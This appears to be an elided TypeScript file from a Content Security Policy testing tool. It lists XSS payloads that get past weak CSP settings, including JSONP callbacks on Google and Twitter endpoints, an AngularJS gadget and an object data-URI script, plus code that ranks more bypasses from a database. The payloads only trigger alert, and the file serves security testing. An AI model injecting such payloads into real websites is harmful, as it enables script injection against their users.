...
export const bypassPayloads: Record<string, BypassPayload[]> = {
  'script-wildcard': [
    ...
    },
    {
      ...
      technique: 'JSONP',
      payload: '<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>',
    ...
    },
    {
      ...
      technique: 'AngularJS',
      payload: '<img src=x ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'">',
  ...
  'jsonp-bypass-risk': [
    {
      ...
      technique: 'JSONP',
      payload: '<script src="https://suggestqueries.google.com/complete/search?callback=alert&client=chrome"></script>',
    ...
    },
    {
      ...
      technique: 'JSONP',
      payload: '<script src="https://api.twitter.com/1.1/users/show.json?callback=alert"></script>',
  ...
  'object-wildcard': [
    {
      ...
      payload: '<object data="data:text/html,<script>alert(document.domain)</script>"></object>',
...
export const getBypassesForVulnerability = (vulnerabilityType: string, fullDatabase?: any[]): BypassPayload[] => {
  ...
  if (fullDatabase && fullDatabase.length > 0) {
    const additionalBypasses = filterDatabaseByVulnerabilityType(vulnerabilityType, fullDatabase);
...
const filterDatabaseByVulnerabilityType = (vulnerabilityType: string, database: any[]): BypassPayload[] => {
  ...
  for (const entry of database) {
    ...
    switch (vulnerabilityType) {
      ...
      case 'script-unsafe-eval':
        if (entry.technique === 'Script Injection' || entry.code.includes('eval')) {
          relevanceScore = 8;
          difficulty = 'medium';
        }
        break;
      ...
      case 'object-wildcard':
        if (entry.technique === 'Iframe Injection' || entry.code.includes('<iframe')) {
          relevanceScore = 8;
          difficulty = 'medium';
        }
        break;
      ...
      case 'style-unsafe-inline':
        if (entry.technique === 'Link Preload' || entry.code.includes('<link')) {
          relevanceScore = 8;
          difficulty = 'medium';
        }
        break;
      ...
      default:
        ...
        if (entry.technique === 'Script Injection' || entry.technique === 'XSS') {
          relevanceScore = 5;
        }
    }
